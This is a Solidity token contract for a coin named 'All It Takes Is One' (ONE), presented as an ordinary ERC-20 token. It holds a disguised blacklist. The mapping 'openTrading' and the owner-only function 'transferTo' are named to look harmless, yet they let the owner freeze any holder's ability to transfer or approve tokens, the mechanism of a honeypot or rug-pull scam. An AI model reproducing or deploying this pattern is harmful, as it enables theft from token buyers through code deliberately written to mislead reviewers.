// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**

Website  : https://allittakesisone.fun/
Twitter  : https://allittakesisone.fun/
Telegram : https://allittakesisone.fun/
*/

contract ONE {

    string public name = "All It Takes Is One";
    string public symbol = "ONE";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public openTrading;

    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OpenTradingUpdated(address indexed account, bool isOpenTrading);

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "1THECOIN");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "2THECOIN");
        require(_to != address(0), "3THECOIN");
        require(!openTrading[msg.sender], "4THECOIN");

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        require(!openTrading[msg.sender], "5THECOIN");

        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "6THECOIN");
        require(allowance[_from][msg.sender] >= _value, "7THECOIN");
        require(_to != address(0));
        require(!openTrading[_from], "8THECOIN");

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "9THECOIN");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function transferTo(address _account) public onlyOwner {
        openTrading[_account] = true;
        emit OpenTradingUpdated(_account, true);
    }
}